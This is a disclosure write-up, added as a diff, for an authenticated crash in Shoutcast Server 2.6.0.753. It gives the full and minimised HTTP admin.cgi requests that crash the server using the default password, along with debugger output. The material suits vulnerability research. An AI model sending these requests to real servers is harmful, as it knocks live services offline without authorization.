@@ -1,0 +1,89 @@
+id: 36671
+date: 08/24/2021
+title: Shoutcast Server 2.6.0.753 Crash Vulnerability
+author: Jeremy Brown
+cves: 
+
+Shoutcast Server Remote Authenticated Crash
+
+=====
+Intro
+=====
+
+Shoutcast Server crashes after failing to handle a non-existent option recieved from a client in an ADMINCGI request. Requires auth to reproduce, so not super exciting but Shoutcast is an old favorite and the minimization of the repro is the most interesting part of this write-up.
+
+It appears that Shoutcast hasn't had a public crash or code exec bug since 2004, and that one was way cooler...
+
+-> https://marc.info/?l=bugtraq&m=110886444014745
+
+============
+Package Info
+============
+
+Tested: Shoutcast Server v2.6.0.753/posix(linux x64)
+
+Package: http://download.nullsoft.com/shoutcast/tools/sc_serv2_linux_x64-latest.tar.gz
+
+=====
+Repro
+=====
+
+----------------
+Crashing Request
+----------------
+
+GET /admin.cgi?pass=changeme&mode=debug&option=donotcrash HTTP/1.1 // what's pass= doing here by default?
+Host: localhost:8000
+Connection: keep-alive
+Authorization: Basic YWRtaW46Y2hhbmdlbWU=
+Referer: http://localhost:8000/admin.cgi?mode=debug
+
+---------
+Minimized
+---------
+
+GET /admin.cgi?mode=debug&option=a
+Authorization:s YWRtaW46Y2hhbmdlbWU
+Referer:admin.cgi
+
+-----------
+Minimized++
+-----------
+
+Taking a look at the minimized version, one can make some guesses about what the target is looking for and even the root cause of the crash.
+
+1) The request is most important part
+2) option= can probably be a lot of different things
+3) The Host and Connection headers aren't neccesary
+4) Authorization header parsing is just looking for the second token and doesn't care if it's explicitly presenting Basic auth
+5) Referer is necessary, but only admin.cgi and not the host or URL
+
+Bonus: passing a valid password isn't needed if the Authorization creds are correct, and visa-versa. Since the minimization is linear and starts at the beginning of the file and goes until it hits the end, we'd only produce a repro which authenticates this way, while still discovering there are actually two options. This leaves us with the "maximum" minimized crashing request.
+
+-----------
+Final repro
+-----------
+
+GET /admin.cgi?pass=changeme&mode=debug&option=a
+Referer:admin.cgi
+
+========
+Debugger
+========
+
+> gdb sc_serv
+(gdb) r shoutcast.conf
+...
+terminate called after throwing an instance of 'std::runtime_error'
+2021-06-30 08:46:42  INFO  [ADMINCGI] Disabling the `donotcrash' debugging options // :D
+  what():  Unknown option donotcrash
+
+Thread 5 "sc_serv" received signal SIGABRT, Aborted.
+
+===
+Fix
+===
+
+No response from security team at Shoutcast
+
+#  0day.today [2023-03-22]  #
